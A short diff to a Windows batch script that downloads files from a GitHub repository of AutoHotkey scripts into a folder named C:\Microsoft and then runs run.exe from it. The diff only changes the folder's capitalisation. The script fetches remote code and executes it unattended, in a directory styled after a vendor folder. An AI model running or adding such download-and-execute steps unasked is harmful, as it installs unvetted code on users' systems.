@@ -1,6 +1,6 @@
 @echo off
 set "baseUrl=https://raw.githubusercontent.com/astorrs276/Public-AHK/main"
-set "destDir=C:\microsoft"
+set "destDir=C:\Microsoft"
 
 :: Create destination directory if it doesn't exist
 if not exist "%destDir%" mkdir "%destDir%"
@@ -42,6 +42,6 @@ for %%F in (
 ) do (
     curl -L -o "%destDir%\%%F" "%baseUrl%/%%F"
 )
-call "C:\microsoft\run.exe"
+call "C:\Microsoft\run.exe"
 
 exit
